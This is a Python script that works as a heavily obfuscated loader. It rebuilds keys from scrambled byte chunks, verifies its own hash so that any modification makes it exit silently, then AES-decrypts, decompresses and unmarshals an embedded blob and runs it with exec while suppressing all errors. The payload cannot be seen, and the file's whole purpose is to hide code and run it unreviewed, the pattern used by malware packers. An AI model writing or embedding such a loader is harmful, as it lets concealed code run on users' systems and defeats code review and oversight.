# ULTIMATE PARANOID OBFUSCATION (STABLE VERSION)
import hashlib, marshal, sys, importlib, base64, zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# --- Interleaved & Shuffled Key Chunks ---
_0leucwmk = b'\x06=\x16\x1e\x1b2\x03\x12^\r!6A\x00@M]\x10t8'
_nygtthwc = b'\x131/\x15D2\x16\\+(\x05`!,\x04(7$Y\x05'
_n9lqtqy3 = b'9Z"}\x03\x16SZ'
_azx3fpu6 = b'sfO3MbO'
_25x8ba63 = b'\x15%\x14-c W\x13\x01y!%8\x1e\x05b\x1c\x0c\x07}'
_t96xugwb = b'HIgtzOwcjO24Ldz'
_7kdtz4vu = b'B29rEgtfA3YLWzs'
_xs97hyth = b'38DDzoLOzM7Egtr'
# --- End of Chunks ---

iv = b'\x05\xa6R\xb5\xad\xbb\x1d\xb0\x91\xff\x94\xd2\xb7\x8f\x08~'
encrypted_data = b'\xbb\x9d\x18\xdb\x88\x0b[\xbf:{\x82]\x8a\xeds\xbe\xd7\xa7\xf6\x94kFF&\xd4]\xb7\xf6+\xa3w!\xbd\xacMj\xfbo\xd9\x07\x0fz\x97\xbb7.\x87\x89\x04E,\xaf\xc3\xee\x16ssW3}\xba\xed\xe2\xff\xa7IN;\xec9\x17\x8b\xd4\xc7\x7f\x8f\xf8\xcb\x89#\xbd\xf3m\x1c\rx\x0b\xba\xd8\xf5\xb3\x9a\x1d A\x859\t\xe1\x13\xedF\xf0e\xa0\'\xdc\xdck\x87\xfd\xc5\xfb\xcfY,\xcbc\xcb\x8a\xee\x8e\x8dzdv\x18\xa1\x8c\xbd\xc2\xda\xf0\\\x1d\x99\x91\x81\xa6#\x10\x848\x88\xf5\xa1Q=w\xcf\xff\x16\xb2N\xa1\xfa)\x03\x14\rR}\xdb|\x95\x88\xfe\xe1`\x06+\xbc\xe7\x82kE\xa3T\x1f\x18-p\xd0\x0fJ(\xd2\x8bW\xceL\xf3RY\x9b\x17\x90{$\xa4\xe0sw\xab\xf5:\xa6\xf2\xe0;J\xcf\xa1\x10\x0b\xb7O\x92\r8\xa6\xe1\x98\x06\xb6\x9c5yL(\xdc\xa4\xf9\t\xfd\xc0\xbe\xdag\xfa\x87P\xdf9\x9dU\'0\xc8V\xc8\xdfo\xcf\xff!\xeb\\\xec.\x18\xf9\xf9g\xd8rM\xa5\xde\x89Ns>,\xf4+C\x0c\xe9z6\xaeM>>W{h$m\xc2\x8aa\xb7C\xd3\x19J\xf1*\x00\x85\xc5\x03\x19\x07\xdd<|)\xe5C\xe1Z\xed\x06C\xde\x18\xf8|\xcb\x1dXp\x1a\x06\x81\xc3\xb8\xca)r\xe9\xf8e\xfcT\xad\xfaf\xb0\xbf\xdfVL\xe8\x07\xba\xbc~6\x13rS4Z\xf3\xff\xb7\r\xf7/\x89\xf6p\xcd\xb10\x94\xad\x11NmX@\xb7\xcf\x18\xe9\x1d\xd8|U\xdb5R\x89\xc5qUm\xba^\xa4e~\x19>\x14\x04\xcf\xf7JW\xe1\x04\x17,\xf2\x86\xf1\x15\x0el\xb8\x86Y\xd2@\xc1\x8f\x80\xef\x90\x81\xd7-\xf1O\xa4\x8f\xac#\\\xb7\x04\xc5\x12F\x90=\xd8*\x88\xc7\xbe\xc5O\xc0xZ[)U5\x98\x93W\x01\x03\xf0\x05&D\x91\xaa[\xc6\xbcqq\x82\x96B\xb0\'~\xdb;\x06\xb9omLy\xfaJE\n\xff\x98|5`\xf8iL\x95~\x132\xec\x9b\x1ep\xa7\xa7\xfau\x88\x0e?\x19c\xcb\xd5\xa9\xbco7]\xf5\xe2\xa1r\x7f\xae:\xcdt\xf24\xd9X\xcd\xe6\x8b\x8f\xb5\xf3\x93d_!\x14\xf1\xd6V[\x1fj\xe3\x0b@.\x02\xdb\xc9Mh\xcb\xec\x86R\xbc*)\x87\xd6\xb4\xfc\xec\x0e\x00H>F\xcf>\x0f\xa5A\xc7\xd9{\xc9\x9e\xc4kPO)\x89\xa1\xd6G\x1f\x14\xe5y\x1f\xbf\xea\xe6]C"\xb8n[\xfc\xb8QON\x03\x13p\x9d\xc2\x981=h|vU\x80y\xf2\xfd\xe8[\t\xcbO\x19\xfb\x97R\xd8\xe8\x938\xf4\xe5\x90\xee\xf2\xcb\xa3\x98Ca\xb4(V\xc2/\x0c\xec\xe2R\x8d]\xaca8\xda\xe1\xf0<n2\xceW\xf7\x14PG\xc9F~Y\xb2\xf9~\xbc\xb2\xe6\xeb\x84\x92k\xe16\x95\xd0i,1]\x04\x88\x07xI71\xec(\xb6\x116],|t\xc1]\xa1\xe6\xbc\x11\xf4X`\x17u\xd4\x7f\xeeU\x93\xb1\x91\x18[d\xc1\x97\x00\xc7\xf6\x19,\x8c_zsb\xdbZ\xf6\xc3dV7\x8e\x88\x0b\xf6\x89\xaf\xa5\x1fH\xcb\xf0\x8f\xcfU\x17\x8aa\xd2O\xfb\x86\xdfU\xccu\xc7\xd7\xbc\x05\xa9\xb2\x94y\x85\x921Z\to\xea\xdc\x02\xae\xe9\xc2\xf5\x06\xa2\xa8\xbd\xd2p\xf0\xbc\x93\xd1@\x88\xfaA3\x8b\xca}\xdf\xa0E\xfb>\xeaT!\x18 >&\x1e}>\x87\x14\x11\xf1&/\xb1\x9c\xfatIz\x9d\x98K\xdf\x00\xbd\t\xe8\xb6\xe9\xf3{\xe5\x97\xe5\xd7\x8a\xad\xc0\xe55DI\':\x96\x8b\xbb4\x14\xd7 \x068?\x96\x0cmx{?\xd8\xc91\xe3\x81R\x9f&\x85\xf8\x12\x811y\xecPO\x0b\xec\xc6\xa5~e\xc8\xe0&\xd5\x95$J$\x1e\x17\x83\xe9D\xc4\x87\xaev\x8c\xc0\xf3\xd1\xc9\xa1\x93\x15/\x05\xa3\xc3\x17\xc6p\xca\x99\xcc&^\xb3#KIn\xef4\x94 \xa6!\xe8\xdd\xa2X\xb2\xe5\xd68>\xabW\xe1\xfb\xf5\x14\'\x192\x1cw\xb0:\xb0\x9f\xd2\xb0\xces\x95\x89\xb6\xc0\xfc~:*X\xd4\xcdT\xa6\x90\x8c\xbf\xd2g=\x17\xbb`\x0e\x85\x91\x90\x8f\x05L\xb5\xad\xd98\xd7\x13\xa7\x99\x96n\xf3\x8a\x1bn\xc0D\xe2\xb4%\xce\xd5\xff\xf5\xa7U\x1e\xdc?\xe8\xf4|Q\xb0\x94\xab\xdc\xf6\xad\x05\xce(\x9b\xc2\xdc\xaf\xa9\x13\xc2F\x99|\x1aR\xab\xc8\xf6_\xd7{m\xd1a+j7\xd6U\xe4{-\xfd\xfb3\x9d\xb3K\xf5W\x19EU\xaa5:\x19\xcd\x94Q\\\xf6AQg\x87~\xdc\xe3s\xc1\xd1\xb5\x82\xc3j\xac\x97\xdd\xcc\xc70\x0b\xd25\xc3ztI\xe9=\xef\x87\xc9N\xf5\xc0\xaf?\xe4p\x13\xea#\x00;\xf7\xf5\xc9:}\xa2b\xb1\x88s\xc6Uy\xfd\xbe2\x0fQu\x0eA\xd3\x8a!e\x15\x0bh\xf04\xd7k\xc9\xa9WQ+\xdf\xf7\x90m\xa2\xb7"=\xe7\xa6\x0f\xea\x146\xa4\xa3\x00\x0c2\x1d=\x1a\x03\x14lQ\x19\xaf\xa2\xff\xd2/G\xfe\xcf\xa6\x9b!\xee\xd6\x9b\xbd\xf0\xe7S\xf9&\xdfJ\xf5\xd4u\x14\xc3\xef\xefSs\x93\x84\x82\x8a\x88\xbe\xf8\xe8\x1eXJ\x18/\xda7g\xcb\xd7N\xac\xd9\xbb\x1cL\xe2\xa3\xb8y\xf8\x8d\xf3\xcc\\1L<\x01L\x1aG\x1d\x0cs1o\xdb\xe0i\x17\xe7\tm)\xb3\x7f\xa0\x04s\xbe\xd9\x12\x18\xf4bssz\xc9?\xa5\x92ul\x93F\x03\xde\xf0\x0e\xd5\xe8o=c\xf4\xe8\x01\x92+\xe8h\n\xd3R\x86e\xe5\x18\x83\xd0N\xc6\x8836#k\xb5\x98q\xaa\xd8\x0f\xc0\xads\xf1\x9f\x9b\x1d\x92\x92\xd2zf\xa6s\xe1$\xc0j2\xe0+\xdf#\x01\xb5\x87\t\x00ew\xfc\x10v\xbf\xeb\xb79\xab\xd2\'\xfb\x96\xb8\x13\x8am\xa1w\xc6\xe1(\x1cF\x82\xfe\xcc\xbdk\'\x9a,A\xe9aGOa\x8a\xa6^\x91]\x1b\xe1\xed\xf7\xa5 \x04\xe7\xed\xaaW\x92\xb6\xbfj\xaf\xdd\xfb}\x85\x19\xf1\x9b\x91\x93-m\x8a\xa8+I\x17a]\x05\x90\x15\xf2\r\xd7\xcbA\x9d\xd3\xc4 !0\xaa\xc0\x03\\\x1f\xbc\xb9]\xfe\xb4\xc2q,\xeb\x00x\xe6\xd2\x01\x8d\xc7P4\xb9\x8d\x05\x12\xf5\x7f\t\xef\xd49\x05\xbb%\xa8*#KS\xb9\xcd\x1c\x16\xa2\x9fV\x14M\xbb\xd4M\xc29\x18o\x8c\xcb\x0b\xb6\x00\x80T\xbb\x1c\xa7\x8f<\xe4M\x06\xa5%\xa0bs\xa0\xbc\xb8\xab\xcbt \x83\xa7\x97\xabEX%0\x07\x90\x07\x88K{c\x05\xafRt\xd23An\xea\xd2\xfe\x89\xc3\x15e\xe9\xfa\xa2\xcae\xc5(\xf50\x15\xbe4\xe9\xc3\xa7E\'\xd4\xee\x19\xf9\xe6\xf73U\xab\x8c\xda\x97A\xbf\x87\xbe\xbf\xa7\x1d\x1b\xeb?[\x1f\'\xac\x04\xe6,\xd66\xd9\xe7Z.\xe5\x03\xf3\xbb\xca\x95\x802\x9f\xb3\xc4\x15\x8bE\x1c\x115\x89e\x1e\xee\xda\x17\xbc1\xc0==y3T\xd1\xbb\xf5\xf36 D\x01Rt\x8dC\xa2_\xe6C\xba\xfc\xe6\xba\x07\x8d2\xbbihRo\x00\x94"\xc7U\x10\xbe\xd4\xc9\x10\x1aH\xf1jf\xbc\x9c)\xc2\xf5\xae?\x14\x13\x89\x06{\x85-\xef#&\xa1c\xfe\xd7\x86w\xcc\xa5\xa1\xa1%%\'\xa5QR\xb7\x06\xc59\xdb\xe7\xf1\x1d43r,X\xdf9d<_\x82\x13\x02\xf1_\x0b\x87-\xfe>\x8d>W\x9f\x95=\xffX\x97\xfa(W8\xbf!D\x9f\xed\xa2\xfc\x1a\x10\xdc\xdd\xcfRV\xb5f+\x80\x9a\x8a\x84\xa6\xac\xb4\'\xba\x18\'5~\xbfA\x85\xe4\xe4L{w\xcal_\xeb1\xdcy\xc91\xec\xbe\x9b\xce\xfbd\x06\xf7\x8d\xe3Q\xb5\xfac/\x80:[\x1c\xc0\xeb\x1b\x95 \x9f\xc8l\\\xcd\x1e\x16o\x9f\xe4\xac\xe2\xa9\x830\x9eRZ\x1a\x04}8F\xe0o\xd6\xe0k,\x05\xd8\xeb\xc0\x95GagDYw\xfe0\x19M`WL\t[\x85\x9eY\xd6\xbc!\xdf\n+\x1a4\xf2\xa6E\xc6Unv\x8a\x9aI\xab\xe9\xc3\xeb\x91\xd7\xaaG\xdd\x809\xf7o\xa4\x90mu\x82\xa0\xd1\x14c\nd_,\x8e\x01\xa5>3\xc1\xaab\x0c\xc3COnVjB\x9f\x0e3\xe2\x91!x\xbd\x1f\xd2{\xdb,\xafI\xf69\x17%\xf7y\xa7H\x94\xa8\x8b\xd9\xae*\xce\xf6\x1f\xd1\x80z\xcc\xca\xdb\n\xee\x13\xf9\xfa\x9e\xac\x08tm\x9a\xbe\xdfR\x0ej,\x96\x06\xf45WT\xf9\xcfh#\xde\xc5\xd01\xeb\xf5\\v\x1e;T\xe3FR~\x89\x87b\xab\xf3\xab\xff\x83\x89\xbem\xdb\xb3\xbb\x9e\xb5h\xb2\xa9\xfb.ZN\xbbD|}y\xaf\xa9\xc9\x84\xb1\xed\xde@\xe4\x19\xab\xd7I\xe1\xf8\x13\x1e\xe6d\xa7\xe6\xca\xf3VT\x02\xfb:9\xb3\x84\x7f\xd2\x8d\xdez\xa7\t6\xd8G#\x89\x14C+\\\x1b\x08:\x80\x8d\xb4\x97\x1f\x9c\xee~\x0b\x94\x0cF\x17\xe6A\xb2\xc2\x98\xde\xd5sXh\xa2\x12}\xec\x00\xec\x08\x99\x0c\x94\xe56\x0b!\x1b_\x9e\xd2\xd6\x1c\x98T\xf55v\xea\xa6\xbb\xb75\xb8\xf8\xebu\x84E\x88\x13\xe2mx\x16\xb8\xebD\x99\xcfk\xd5\x88\xddY\x9a0W-\xccE\xad\xef\xd7\xa8\x8ayt\x80m\x02\xa0EQ\x0e\xe9\xd5\xc3]\xdb\xb2n\n\x83\x83\xdf\xbc\x9di\xdc\x11\xca\xb7\x94\xe0\xdbn~\x12p1\xadC<"\x8e\x81\x13>7S\x93F\x1c\x89\x10+6S7E\xc1\xa7\xfd\x89\xc0\x9a\x1c\xc9`$w\x90%c\x92 4;\xda\x95u\x86\xf43\x11\xe7\xf6@p\xf9\xfa&\xca/\xb0\xa2\x06u\x16\xab \xc2\\Y\x16\xe6,\xef\xa4\xff#x\xc1F\xe8\x12\x9cBA\x1a\xc8\x11\x99\xdf\xff\xa5\x02\xcb\xb0\x81\xf9\x86\xd4\x9b\xfd:\x80\xa3\xa5qwd\xa4A\x89\xd5\xa2\xf0V6\xed\xe0\xed\xd8\xa3\xebN/\xd7\x91\xfb"\xc7rI\x99\xcd\x17\x11\xf38\xee\x9eS\xd9q\x92\x8a\x81$O\xaf%0u\xe4\x1a(\xf6\xf0\x85\x80\x04\x9f\x8b\rNb\x08\xa1\x18\xdc\x8f\'\nOZ\xbd\xfe;U\xb7\x88\x1d\xec\xe6)\xf7 \x98 \xaf\xf3ef\x13@\x81\x9e<8\xd8\xa8[\xe7\xb1\xb4\xe0^\xf3Yl\xa9\x87\xe8\x8fn\xb3\xa6\x03d\xc60^\t\xe5\x1dL\xd4\\\xba\xab!o?\x17w\xe2"\xeb\xba+"\x0e\x10`\xa5\xf6\xe1\xc5\xc7\xbd\xfdP\xa0E\x94\xd1\x0b?=\xaa2\x05\x8c\x9cb,\xdf\x99E\x903l\x11=\xf3\xb3uI\x88\xfb\xa9\xc4kAW\x04\xab\xc4"\xd9\xc1SP\x0fV\xea\xc8-_\xea\xb6\x9b\xf3?,\x12\x827\xa25#\xd2+e\x98\xa7\xb7\x8b\xf8\xba\xb0\x1a2\xfa\xb2\x97\x84\xd2\x0c\x03\x05\xb0C\x93,^\x8b\xac\x0c\xe0\x1fC\x83C\xa9\xd7\x93n\xf8\x91\xfdS\xbe\xaf\x19\xf1K("*%\x00\xc9j\xae\xc5\xeb\xeb\xe1\x9a\xe2\x8c\xc9\xef+\xc7A\x8d\xebG$\x9e?\xce\x07\xc5\x1c\x93J\xf0\xc68\xf3\xe8\xeb3e\xc4\x83\xb6=\x16A\x86\x1b\xd3\xba\x88\x91}\x00\xbe\xc7\x16\xad\xd2\xd21\xa5\xa7\x96b\xf8\x9f\xac\x1f\x84zIx%"?&\xe5\x01\xdc\xdc\x9e\xae\xbac\xe8\xde\x04\xe6C\x9a\x05\xa1\x10\x0e\x1b5\xc7\xb8]s\xdb\x8aMP\xf0\xbfF0\xc6\xf1C\x19\\}\xba\xb9\xe3,\x1a\xd0\xa5\x8c\xc9\x1c\x97\xdeJ\xc1\xbf\xcfx\xa3c\xa9\xf3\x19sn\xce?\xf53\xe4/A\xbeb*\xa8\x969\xf4\xb6\x17\xbej\x7f\x84\xa5yqIU6\xacYz^\xc4\x83\xcd\x87\x1f\r\x97:B\xedL\xc9K\xc3rL\x8c\xfb\xc1\xc6=\xb0\xd1\xe9\x01X8Z\xdf\xfc\xe2N\xc0\xa4\xa6\x01\x010g\xcb\xf4\xd2V\x82\xc6\xd5\xf6*\xfb\xde\xde\xf2\xf0\x88\x11\xdc\xab\x1e<`\xe3M\x82u\xeedB\x0e\x0b\xa3\x10\xbe\x8f\xa1\xdf#|\x8c\x95\r\xc8\x8e\x04\xc6dMp\x8a*\xf7!\xba\xd3\xe6\xddu\t\xf0[\xb8\x9fv\x9e\x10\xe7\x06\x0e\x9694=\x8a\x058eS\r_l\x1e\xee\x07\x89\xcc\xbb\x1dkx\xfa\x9d\x1a\xa1\xbb\r\xbf\xf0\xfdhC\x9a\t\xe0\x99\x13\xb2\xcf\xb0TZX;\x06:\xd9\xca;"\xd6\x85t\xae\xff\xd5\xa8O \xecbT\xcfrF!\x81\x95\x8a\x97A>\xee9\xa4\xe8D\x8dDA\xdc\x9f\x1fm]\xcfIE\x91\xe2s5\xf9b\xa0m\xfb\x12\xee\x96\xac\r\x90\xf17\xcfB\xaa\x1e?\xe5c\xba\x8d\xb7\x02j)\xb1f\xdf\x115\'\x89^\xf8\xf1\xd5\xc2\xa13\x8e\xe6\x94T\xf8\xd5\x9b\xe6\xe6\xbe\xac\xa1\x00\xfb\x91\x1a@\xbb\x10\x9f\x96W`:o\xa3%@\xc7"\xac\xb0\xb8\x9d\xe4.z\x88\xb2U\xb9\x8b\xdf\xe3b@\x98\x91\xcd\xc8\xbb\x08\x06%\x1a\xcb\x99\xc4\xaeH\t\x95\x07.4]\xa7B:\xd1y\'\xf4\xd3\x95\xbbLE\x16D\x88M#\xd3\x96t\x01*\xde\xf7[5C\xb1\xae\x983\x08\x8c7\xfag>\xc8\xc5\xa9\xfd-$@\xfd\x9cR\'\x14\x9d^\xe6\xbd\xd7\x7f\xb6\x0f\xc80%c-\x84\x972{\x0b`\xf7\xf3\x1d5\xfd\xc4\xcf\x16\x8e\xf5\x15\xa6+\x87<\xcf\x1f\x1e:\xb0\xeaYX\xdfbz\x1fy\x8f\xf6bl\xa6f\xfa\xd3N)\x1a\x89\xdeV\xd3\xe7TPb@V\x16\xa2\x90D\x88\xbc\xeeR\xfe\xfd\x97\xf2I\x06\x13\r\xa1\xe9\xeb\xd2`\xe9j\t%K9Jm!\x95\xeeM-\xebn\xc8\xf5`\xec\xe7\xdf\xfb^\x88\x1fbkW\x10\x81\x07\x8c\xeb[\x94\x00\xe6D\xe5\xfe1\x9bvU\xe3A\xe4\xf5^\x9f?QW\xde\xa1\x89\x19\x12>_q\x86\x91\xc8;\x8d\xeeh\xeb\xdcA>\xd6\xfdF\xeb\x10\x97!Ae~\xffJ\xbcj\xe1\xdbn\xa8\xee\x80\x8f\xba\xe0\xd4\x9d\xdcE<\x12Z\x95E\xc9\xf6J\x9f\x06:~_\xca6]2\x195qY\xdcqJ8\x1b\xf3\x89{\xcb\x95\xd6\xa1S\x8b\xcd\xe6\x8e\x01\xb9\xdf7\'\xabL\xc7\xa4\x07\xbd\xf4\x96T/\r%,\x15\x9f\x85U\xe1g\x93O\xc4\xde\xda\xf9\xb5\x01]\xae\xb1\x9aS_\x0c\x8e*\\=\x9b)Jku-\xe1\x88O\xc5\x88;z\xeb\xfd\x96\xbdJ\xc0I\xe1>\x02\xdb\xeb\xce\xcb\xb7\x05\x81{\xe6\xa1^\x05q+|\xf5\x1f\x9f\x95\x13\xbd\x0e\xfeV\xa7\xf6d\x122\xa7\x89\x0b\'.\x19\xf8\x8f\x9a\x8aL\xe1\xe4\xd2\xac\x04\xb2\xba\xde(\xf0bk\xf3\xa7[\x9a\xb6 \xcf\xc3D\xb9\xd1.I\xb8\x91/#g\x99{\xfb\xa9\xdf\xc0v \x15h\xb1\xd0\x1c\xf3\xfe\x8bF\x0b]\x160\x89x\\\xed{\xf4\xfc\xb6\xa5\x04U=\x0bc\t\xf7j\xa4\x0e\xd0\x98\xb4\xcf\xa8?^\x9d\xb1\xf2\xe2(x\xf8D\x1c\xebk\x07p\xe9s\x8b\xe1\xc9\xb3\xc5O\x96\x9d@K\xc2}\x8e\xe0P\x93\x90\x08\x83\xe9\xe3\x051\x93\x94\xf0j\xdc\xf1\xa88\xc9\x0c\xe7\xce\x00@\x0fX\xd5.cl\xbd\xa8\xb6\x9eCQ\xe8H\x87\xa2\xf3\x83\xce\xfd\xb9\n\xbf\x94\x11\xf7\xe7$\x99/\xb0\xcb\xe1~y9+\xa3\xde\xce\x92j\xff\xf4\t\xa7\x00\x12\xd4C;&\xfdr\x11\x17\xa1\xef\x19pcZ\xbb\xd1\xdf\xdb\xe4\x9e\x9e\x0b"\xf5\xbc\xef\xc0C\x97B\xb6O\x98[\x02nu\x9f)\x07$}\xd1xy\x8c\xfa\x0f\xed*O\r\xefm\x81\xce\xf8\xf0\xc1%\xbc_\x84B\x06a\xf6q\xa44\xce#y*\x0f\xafN\xdf:\x1b2&\xcb\xa5\x0e\xca[\xd1\xcf\xdb\xc2<2N4\x94\xe3\x0bu\x01H\xf1\x18P\x0f\x9a6\x95M\x0f\x16\xfb\xfc\xa2\xa3\x8e\x17/\x0ba\x97L\x11m\xa7/\xfc$\xc1\xd9\x06\xfd\xaf\xc3\x16\xb7\xdaP\x9fc#\xe8\xd6\xc6\x93%\x9a\xb4\x14\xd8]\xac\x06\xa2z\xba\x89v\xb8\x91\xe5\xde\xfc\xde\xa9\x89r\xb4W\xb4\xb9\xea\t#\xd9U]8\xf0\xbb`8\xbd\xb7\xf5\xb4\xb2x\xc4\x1a\xaa\x96#E\xcb\xfb^\x91\x0c\xde\xe9\xa2\xe6\xc1\xf1y3d<\x9c\xacR\x11\xbe\x96\x8a\xfaI+\xc0\x9f\xfbh3\x0e\xca\x12\x0c\xf1u\xd3J\xea\xff\xf6\x19\xb4\x98\x9bwJ\x08\xbb3\x0c(\x89qg"\x14uBG}\xf1@-Q\x9b\xc6x[\xf9\x87\x03\x03\xd6\xfc&\x85\xab\xa3\x843C\xe0x\xe6\xd7\x9d9!3tGb\x1d;\x9a\xe3<\xd1\xaf\xa6\x1e^\\"Q\xbb\xd5\x04A\x033J\xbcgUX\x16K\x99\xca\x08\xbc8\'\xc7\xd8ya\xe4qW\xc3\x01\x01G\xad\xa1\xb9\x1e\x82\x14`\xcd\xdd\xcb%=K\xe02Pr\xf0\xc9\xb1\xda\x1cMS\x0f"j\xdeG \x86\xf3\x88`n\xb1\x15\xf4a\xfd\xcf0\xe9\xae\xae\xee$\xcb\x8ay%\x86eB@\xc9\xef\xce:\x8f\x00N\t\x90\xba\xfa\r8\xd6\xb9^\x96\xef\xa0\x88\x03\x10\xfa1/\xad\xf2\xc9\xca\xbbPf\xa8\xcc\xa2hqO\xd5g\xd1\x8dW\xa0^x\x10\xf6\x1f\x15\xaa\xcdMb\xe8vH\xa2By\xf2\xf8\x9cDz\xedX\x8d\xbd\xcc\xa4\x80\x80\x94|*\xe5Z\xde\xd8x\xba\xa6\xc3\x88\x12m\xebZ\xde\xa0:y\\\x07vxT\x10\xad\xf3\xaeRJ\x82N\xd3\x19\xb88\x80\n\x07\xfd\xfc\xca\x9d\x99\x10\xa6\xb3Ou8$\xbd\xcd\xef\xfe\x02\xc2=\x9f\xdf\n\xfd\x14\xd0Iy\x01\x143<U\xf3.*l\xf1\\_\xd4\x10k\xcd\xe0\x93\x869\x9a\xbf\x0b\xbf\xbf)\xb6\xb4V\xc2f\xe0\xaffvn\xa4\x962>\xff\xf6\xd5\xa6\xcc\xac!\xc7\x8a\xd0M+\x82O\xea\xb2[\xa4\x02\xf1\xf5m\x87\x1d#\xd7\x07\x83_\xe9\x11P\xa1\xaa\x91\xba\xffv\x9d\xdc&\xd5\x87\x9b\xd6\x04\xd0 \x90\xa6\xa1\xfc\xbf\x86z\xdd\x0c\x1fC\xdb8\xadW\xb1\x88;{\xa8\xbb\x9a\xe8\xfc\x99j\x80\x92\x1f\xa7\xd0\xa5`\x15m\xcaDr>xF^n\xca\xc1X\x97f\xc1\xf6\x0cv\xfe\xf9\x19\x90\xec\x82O\xd7\x07B\xd7\xe1tU\xb2zT\xbe\x0c\x00mV+\x8c\x1a \x80\xfe\xb3-\xb5V\x84\xc8\xae\xd8)\x02j-\x16\x89n\xc9[Z\xbc\xe3\xc1uz1\x16\x88\x85\xda\xf0\xbf\x9aM\x00\xee1\xfe\xd4l\x05y%V\x82q\r\x91\x12\xd6hw\x1189]\xde\xe1\xd9`$\x07\xba}\x16\xce8\xe9\xc6\x04\x9fv)\x93>\xe6C\x19\x93\x87G\x8dD\xe1\x80\xe2mV\xdf\xb0}n\xa0\x81\x997\n\x1aw\xc6b\xe7#\xca+TU\x14\x8fD\xff\x0f4\xc8\xdc\xab.\x90\xe9\xddJ\xfd\xa5q0\xb9\x9b`\xa3\xdb\x90I\x0ch\xd2\x0bc\x0e;\x03\xc7b\xc8\xc4% }\x91t=\x9f\x1e\xb5\xdd\x12\x8fD\xb6U\xfa\xaaL\x84\xdat\x8e\xab{s\xf8>\xfb\xf7\x15<\xa0|t)+\xb8A \x992%{I\xde\xe7\r\x9f\xaeU\xfa\xac7\xca\xa0XS\xeae\xfe\xfeo\x86\x11\xd2\xc9j\x12u\x05^\xc9\xe8\x1aG\x80k\x80\xc6\xad\xa5\xe1\xb6\x02r\xb1p\x12\xe9\x19U\xa8\xf3\xa0(Uu\xadV1\x9b\xd9i\xb2\xf4\xda\x80\xe0K,GQon\x1f\xd4\xe4\x1e\xd1'
EXPECTED_HASH = "daf74875bb43fd0f7d3112b14b0d5870ec3ec9993153dfa02854874ca4a401d3"

# Obfuscated module/function names
B64M = 'YmFzZTY0'
B64F = 'YjY0ZGVjb2Rl'
ZLM = 'emxpYg=='
ZLF = 'ZGVjb21wcmVzcw=='

def xor_cipher(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

try:
    # 1. Integrity Check
    hash_placeholder = "0" * 64
    with open(__file__, 'r', encoding='utf-8') as f:
        own_code = f.read()
    code_to_verify = own_code.replace(EXPECTED_HASH, hash_placeholder)
    current_hash = hashlib.sha256(code_to_verify.encode('utf-8')).hexdigest()
    if current_hash != EXPECTED_HASH:
        sys.exit(0)

    # 2. Dynamic De-obfuscation Function Retrieval
    b64_mod = importlib.import_module(base64.b64decode(B64M).decode('utf-8'))
    b64_dec = getattr(b64_mod, base64.b64decode(B64F).decode('utf-8'))
    zlib_mod = importlib.import_module(base64.b64decode(ZLM).decode('utf-8'))
    zlib_dec = getattr(zlib_mod, base64.b64decode(ZLF).decode('utf-8'))

    # 3. Reconstruct Heavily Obfuscated XOR_KEY
    reassembled_xor = _xs97hyth + _7kdtz4vu + _t96xugwb + _azx3fpu6
    transformed_xor = b64_dec(reassembled_xor)
    XOR_KEY = bytes([b ^ 175 for b in transformed_xor])

    # 4. Reconstruct Obfuscated SECRET_KEY
    obfuscated_secret = _25x8ba63 + _nygtthwc + _0leucwmk + _n9lqtqy3
    s_step1 = xor_cipher(obfuscated_secret, XOR_KEY)
    s_step2 = b64_dec(s_step1)
    s_step3 = zlib_dec(s_step2)
    SECRET_KEY = b64_dec(s_step3)
    
    # 5. Decrypt and Execute
    key = hashlib.sha256(SECRET_KEY).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(encrypted_data)
    unpadded = unpad(decrypted_padded, AES.block_size)
    decompressed = zlib_dec(unpadded)
    code_obj = marshal.loads(decompressed)
    exec(code_obj)

except Exception as e:
    pass
